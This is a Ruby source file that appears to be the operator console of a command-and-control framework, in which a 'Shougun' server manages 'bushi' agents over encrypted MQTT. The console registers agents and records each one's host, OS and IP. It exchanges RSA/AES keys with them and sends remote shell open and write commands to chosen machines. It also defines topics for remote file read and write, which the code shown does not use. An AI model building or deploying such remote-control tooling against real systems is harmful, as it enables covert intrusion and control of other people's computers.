require 'base64'
require_relative 'shougun'

mqtt_topics = {
	:public_key						=> "/bu/public_key",
	:bushi								=> "/bu/bushi/+",
	:remoteshell					=> "/bu/bushi/+/bushido/remoteshell",
	:remoteshell_open			=> "/bu/bushi/+/bushido/remoteshell/cmds/open",
	:remoteshell_close		=> "/bu/bushi/+/bushido/remoteshell/cmds/close",
	:remoteshell_write		=> "/bu/bushi/+/bushido/remoteshell/cmds/write",
	:remoteshell_onopen		=> "/bu/bushi/+/bushido/remoteshell/events/open",
	:remoteshell_onclose	=> "/bu/bushi/+/bushido/remoteshell/events/close",
	:remoteshell_onread		=> "/bu/bushi/+/bushido/remoteshell/events/read",
	:remoteshell_onwrite	=> "/bu/bushi/+/bushido/remoteshell/events/write",
	:remoteshell_onerror	=> "/bu/bushi/+/bushido/remoteshell/events/error",
	:filerw								=> "/bu/bushi/+/bushido/filerw",
	:filerw_open					=> "/bu/bushi/+/bushido/filerw/cmds/open",
	:filerw_close					=> "/bu/bushi/+/bushido/filerw/cmds/close",
	:filerw_read					=> "/bu/bushi/+/bushido/filerw/cmds/read",
	:filerw_write					=> "/bu/bushi/+/bushido/filerw/cmds/write",
	:filerw_onopen				=> "/bu/bushi/+/bushido/filerw/events/open",
	:filerw_onclose				=> "/bu/bushi/+/bushido/filerw/events/close",
	:filerw_onread				=> "/bu/bushi/+/bushido/filerw/events/read",
	:filerw_onwrite				=> "/bu/bushi/+/bushido/filerw/events/write",
	:filerw_error					=> "/bu/bushi/+/bushido/filerw/events/error"
}

shougun = Shougun.new

shougun.internals[:rsa].config({
  :key_size => 2048
})

shougun.internals[:mqtt].host = 'localhost'
shougun.internals[:mqtt].port = 1883
shougun.internals[:mqtt].persistent = true
shougun.internals[:mqtt].blocking = true
shougun.internals[:mqtt].reconnect_limit = 3
shougun.internals[:mqtt].reconnect_delay = 60

shougun.internals[:mqtt].on_connack do

end

shougun.internals[:mqtt].add_topic_callback(mqtt_topics[:bushi]) do |packet|
  begin
    packet = Base64.decode64(packet.payload)
    packet = shougun.internals[:rsa].decrypt(packet)
    packet = shougun.internals[:serialization].deserialize(packet)

		bushi = shougun.bushi.find { |bushi| bushi.id == packet['id'] }

		if !bushi then
			bushi = Bushi.new
			shougun.bushi.push(bushi)
		end

		bushi.id = packet['id']
		bushi.host = packet['host']
		bushi.os = packet['os']
		bushi.ip = packet['ip']
		bushi.status = packet['status']

		bushi.internals[:aes].config({
			:key_lenght => 128,
			:mode => :CTR,
			:key => packet['aes']['key'],
			:iv => packet['aes']['iv']
		})
  rescue StandardError => error
    puts error.backtrace
  end
end

shougun.internals[:mqtt].connect(shougun.internals[:mqtt].host, shougun.internals[:mqtt].port, shougun.internals[:mqtt].keep_alive, shougun.internals[:mqtt].persistent, shougun.internals[:mqtt].blocking)
shougun.internals[:mqtt].subscribe(["#", 2])

Thread.new {
	loop do
		shougun.internals[:mqtt].loop_read
		shougun.internals[:mqtt].loop_write
	end
}

while command = $stdin.gets.chomp
	case command
	when 'pub key'
		packet = shougun.internals[:rsa].public_key
	  shougun.internals[:mqtt].publish(mqtt_topics[:public_key], packet, true, 2)
	when 'list'
		shougun.bushi.each do |bushi|
			puts "#{bushi.id} #{bushi.status}"
		end
	when 'rs open'
		topic = mqtt_topics[:remoteshell_open].dup
		id = $stdin.gets.chomp
		topic['+'] = id
		packet = {
			:id => $stdin.gets.chomp,
			:shell => $stdin.gets.chomp
		}
		bushi = shougun.bushi.find { |bushi| bushi.id == id }
		packet = shougun.internals[:serialization].serialize(packet)
		packet = bushi.internals[:aes].encrypt(packet)
		shougun.internals[:mqtt].publish(topic, packet, false, 2)
	when 'rs write'
		topic = mqtt_topics[:remoteshell_write].dup
		id = $stdin.gets.chomp
		topic['+'] = id
		packet = {
			:id => $stdin.gets.chomp,
			:data => $stdin.gets.chomp
		}
		bushi = shougun.bushi.find { |bushi| bushi.id == id }
		packet = shougun.internals[:serialization].serialize(packet)
		packet = bushi.internals[:aes].encrypt(packet)
		shougun.internals[:mqtt].publish(topic, packet, false, 2)
	end
end
